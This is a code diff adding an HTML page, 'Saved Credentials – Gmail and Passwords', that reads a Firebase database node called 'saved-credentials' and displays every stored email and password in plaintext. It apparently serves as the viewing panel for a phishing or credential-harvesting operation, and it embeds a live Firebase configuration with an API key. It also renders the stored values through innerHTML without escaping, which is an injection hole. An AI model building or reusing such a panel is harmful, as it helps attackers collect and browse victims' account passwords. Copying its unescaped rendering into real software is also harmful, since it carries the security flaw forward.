@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>View Credentials | Secure Space</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Rajdhani:wght@500;700&display=swap');
+
+    body {
+      background: linear-gradient(180deg, #0d1117 0%, #1c2530 100%);
+      color: #a7f3d0;
+      min-height: 100vh;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 20px;
+      user-select: none;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 85%;
+      padding: 40px;
+      border-radius: 15px;
+      background: rgba(0, 0, 0, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.4);
+      transition: all 0.3s ease-in-out;
+      margin-bottom: 40px;
+    }
+
+    .container:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 12px 20px rgba(0, 0, 0, 0.5);
+    }
+
+    h1 {
+      font-size: 3.2em;
+      color: #e9d8fd;
+      text-shadow: 0 0 20px #e9d8fd;
+      margin-bottom: 30px;
+      text-align: center;
+      animation: colorShift 4s linear infinite;
+    }
+
+    h2 {
+      font-size: 2.4em;
+      color: #00f7ff;
+      text-shadow: 0 0 12px #00f7ff;
+      margin-bottom: 25px;
+      text-align: center;
+    }
+
+    #credentials-list {
+      margin-top: 30px;
+    }
+
+    .credential-item {
+      margin-bottom: 20px;
+      padding: 25px;
+      border-radius: 10px;
+      background: rgba(0, 0, 0, 0.4);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .credential-item:hover {
+      background: rgba(0, 0, 0, 0.5);
+      transform: translateY(-3px);
+      box-shadow: 0 6px 10px rgba(0, 0, 0, 0.4);
+    }
+
+    .credential-label {
+      font-size: 1.2em;
+      color: #a855f7;
+      font-weight: bold;
+      margin-bottom: 8px;
+      text-shadow: 0 0 5px #a855f7;
+    }
+
+    .credential-value {
+      font-size: 1.1em;
+      line-height: 1.7;
+      color: #b3fff7;
+      word-break: break-word; /* Prevent long values from breaking layout */
+    }
+
+    .no-credentials {
+      font-size: 1.2em;
+      color: #ccc;
+      text-align: center;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+    <h1>Saved Credentials</h1>
+    <h2>Gmail and Passwords</h2>
+
+    <section id="credentials-list">
+      <p class="no-credentials">Loading credentials...</p>
+    </section>
+  </div>
+
+  <script type="module">
+    // Import Firebase SDK
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+    import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
+
+    // Your Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyDaTurSbn-e8roa7o9DeAzEDAb_ZETBu3I",
+      authDomain: "comment-app-eae1d.firebaseapp.com",
+      databaseURL: "https://comment-app-eae1d-default-rtdb.firebaseio.com",
+      projectId: "comment-app-eae1d",
+      storageBucket: "comment-app-eae1d.firebasestorage.app",
+      messagingSenderId: "1085942013485",
+      appId: "1:1085942013485:web:8b73425849e72db191e2a4",
+      measurementId: "G-WF0852Z57K"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+    const credentialsRef = ref(database, 'saved-credentials');
+    const credentialsList = document.getElementById('credentials-list');
+
+    onValue(credentialsRef, (snapshot) => {
+      const credentialsData = snapshot.val();
+      credentialsList.innerHTML = ''; // Clear previous data
+
+      if (credentialsData) {
+        Object.values(credentialsData).forEach(credential => {
+          const credentialDiv = document.createElement('div');
+          credentialDiv.classList.add('credential-item');
+          credentialDiv.innerHTML = `
+            <p class="credential-label">Gmail:</p>
+            <p class="credential-value">${credential.email}</p>
+            <p class="credential-label">Password:</p>
+            <p class="credential-value">${credential.password}</p>
+          `;
+          credentialsList.appendChild(credentialDiv);
+        });
+      } else {
+        credentialsList.innerHTML = '<p class="no-credentials">No credentials saved yet.</p>';
+      }
+    });
+  </script>
+
+</body>
+
+</html>
